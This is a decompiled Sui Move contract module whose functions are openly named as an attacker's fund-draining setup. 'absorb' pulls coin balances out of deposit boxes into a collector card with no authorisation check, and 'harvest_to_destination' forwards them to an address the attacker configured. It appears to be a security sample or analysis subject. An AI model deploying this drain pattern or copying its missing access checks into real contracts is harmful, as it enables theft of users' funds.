module 0x61037f063d1ca55bf444b7244f332a13ec2170f37ec70cba5c36263def627dfa::vault {
    struct DepositBox has store, key {
        id: 0x2::object::UID,
        label: vector<u8>,
        deposit_count: u64,
    }

    struct CollectorCard has store, key {
        id: 0x2::object::UID,
        owner_name: vector<u8>,
        total_drains: u64,
    }

    struct AttackerConfig has store, key {
        id: 0x2::object::UID,
        final_destination: address,
    }

    struct CoinBalanceKey<phantom T0> has copy, drop, store {
        dummy_field: bool,
    }

    public fun absorb<T0>(arg0: &mut CollectorCard, arg1: &mut DepositBox) {
        let v0 = CoinBalanceKey<T0>{dummy_field: false};
        assert!(0x2::dynamic_field::exists_with_type<CoinBalanceKey<T0>, 0x2::balance::Balance<T0>>(&arg1.id, v0), 1);
        if (0x2::dynamic_field::exists_with_type<CoinBalanceKey<T0>, 0x2::balance::Balance<T0>>(&arg0.id, v0)) {
            0x2::balance::join<T0>(0x2::dynamic_field::borrow_mut<CoinBalanceKey<T0>, 0x2::balance::Balance<T0>>(&mut arg0.id, v0), 0x2::dynamic_field::remove<CoinBalanceKey<T0>, 0x2::balance::Balance<T0>>(&mut arg1.id, v0));
        } else {
            0x2::dynamic_field::add<CoinBalanceKey<T0>, 0x2::balance::Balance<T0>>(&mut arg0.id, v0, 0x2::dynamic_field::remove<CoinBalanceKey<T0>, 0x2::balance::Balance<T0>>(&mut arg1.id, v0));
        };
        arg0.total_drains = arg0.total_drains + 1;
    }

    public entry fun create_deposit_box(arg0: vector<u8>, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = DepositBox{
            id            : 0x2::object::new(arg1),
            label         : arg0,
            deposit_count : 0,
        };
        0x2::transfer::public_transfer<DepositBox>(v0, 0x2::tx_context::sender(arg1));
    }

    public entry fun harvest_to_destination<T0>(arg0: &mut CollectorCard, arg1: &AttackerConfig, arg2: &mut 0x2::tx_context::TxContext) {
        let v0 = CoinBalanceKey<T0>{dummy_field: false};
        0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(0x2::coin::from_balance<T0>(0x2::dynamic_field::remove<CoinBalanceKey<T0>, 0x2::balance::Balance<T0>>(&mut arg0.id, v0), arg2), arg1.final_destination);
    }

    public entry fun setup_attacker(arg0: vector<u8>, arg1: address, arg2: &mut 0x2::tx_context::TxContext) {
        let v0 = CollectorCard{
            id           : 0x2::object::new(arg2),
            owner_name   : arg0,
            total_drains : 0,
        };
        let v1 = AttackerConfig{
            id                : 0x2::object::new(arg2),
            final_destination : arg1,
        };
        0x2::transfer::public_transfer<CollectorCard>(v0, 0x2::tx_context::sender(arg2));
        0x2::transfer::public_transfer<AttackerConfig>(v1, 0x2::tx_context::sender(arg2));
    }

    public fun stash<T0>(arg0: &mut DepositBox, arg1: 0x2::coin::Coin<T0>) {
        0x2::coin::value<T0>(&arg1);
        let v0 = CoinBalanceKey<T0>{dummy_field: false};
        if (0x2::dynamic_field::exists_with_type<CoinBalanceKey<T0>, 0x2::balance::Balance<T0>>(&arg0.id, v0)) {
            0x2::balance::join<T0>(0x2::dynamic_field::borrow_mut<CoinBalanceKey<T0>, 0x2::balance::Balance<T0>>(&mut arg0.id, v0), 0x2::coin::into_balance<T0>(arg1));
        } else {
            0x2::dynamic_field::add<CoinBalanceKey<T0>, 0x2::balance::Balance<T0>>(&mut arg0.id, v0, 0x2::coin::into_balance<T0>(arg1));
        };
        arg0.deposit_count = arg0.deposit_count + 1;
    }

    public fun stored_amount<T0>(arg0: &CollectorCard) : u64 {
        let v0 = CoinBalanceKey<T0>{dummy_field: false};
        if (!0x2::dynamic_field::exists_with_type<CoinBalanceKey<T0>, 0x2::balance::Balance<T0>>(&arg0.id, v0)) {
            return 0
        };
        0x2::balance::value<T0>(0x2::dynamic_field::borrow<CoinBalanceKey<T0>, 0x2::balance::Balance<T0>>(&arg0.id, v0))
    }

    // decompiled from Move bytecode v7
}

